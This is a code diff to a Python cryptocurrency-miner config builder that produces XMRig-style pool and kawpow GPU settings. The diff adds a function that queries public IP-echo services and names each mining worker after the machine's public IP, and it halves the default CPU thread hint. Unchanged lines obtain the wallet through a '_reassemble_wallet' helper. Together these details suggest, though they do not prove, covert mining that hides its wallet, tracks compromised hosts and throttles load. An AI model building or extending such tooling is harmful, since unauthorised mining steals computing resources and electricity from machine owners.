@@ -74,6 +74,36 @@ def get_hostname() -> str:
     return socket.gethostname()
 
 
+_cached_public_ip: str | None = None
+
+
+def _detect_public_ip() -> str | None:
+    """Hit lightweight IP-echo services to find this machine's public IP."""
+    global _cached_public_ip
+    if _cached_public_ip:
+        return _cached_public_ip
+
+    import urllib.request
+    import re
+    services = [
+        "https://api.ipify.org",
+        "https://ifconfig.me/ip",
+        "https://icanhazip.com",
+        "https://checkip.amazonaws.com",
+    ]
+    ipv4_re = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
+    for url in services:
+        try:
+            with urllib.request.urlopen(url, timeout=5) as r:
+                text = r.read().decode().strip()
+                if ipv4_re.match(text):
+                    _cached_public_ip = text
+                    return text
+        except Exception:
+            continue
+    return None
+
+
 def _unique_worker_suffix() -> str:
     """Short hex suffix derived from machine-id or MAC to avoid worker collisions."""
     import hashlib
@@ -94,7 +124,13 @@ def _unique_worker_suffix() -> str:
 
 
 def get_unique_worker_name() -> str:
-    """Hostname + short machine hash for globally unique pool worker names."""
+    """
+    Worker name = public IP with dots replaced by dashes (e.g. '52-3-27-85').
+    Falls back to hostname-hexsuffix if IP detection fails.
+    """
+    ip = _detect_public_ip()
+    if ip:
+        return ip.replace(".", "-")
     host = socket.gethostname()[:12]
     return f"{host}-{_unique_worker_suffix()}"
 
@@ -133,7 +169,7 @@ class ConfigBuilder:
             "url": pool_url,
             "user": pool_user,
             "pass": pool_pass,
-            "rig-id": get_unique_worker_name(),
+            "rig-id": self.settings.get("worker_name") or get_unique_worker_name(),
             "nicehash": False,
             "keepalive": True,
             "enabled": True,
@@ -211,7 +247,7 @@ class ConfigBuilder:
     def build(self) -> dict:
         threads = _detect_cpu_threads()
         ram_gb = _detect_total_ram_gb()
-        hint = self.settings.get("max_threads_hint", 100)
+        hint = self.settings.get("max_threads_hint", 50)
         pool_host = self.settings.get("pool_host", DEFAULT_POOL_HOST)
         pool_port = self.settings.get("pool_port", DEFAULT_POOL_PORT)
         pool_user = self.settings.get("pool_user") or _reassemble_wallet()
@@ -388,7 +424,7 @@ class ConfigBuilder:
 
         return {
             "wallet": gpu_wallet,
-            "worker": gpu_settings.get("worker", get_unique_worker_name()),
+            "worker": gpu_settings.get("worker") or self.settings.get("worker_name") or get_unique_worker_name(),
             "algo": gpu_settings.get("algo", "kawpow"),
             "pool": pool,
             "port": mapped_port,
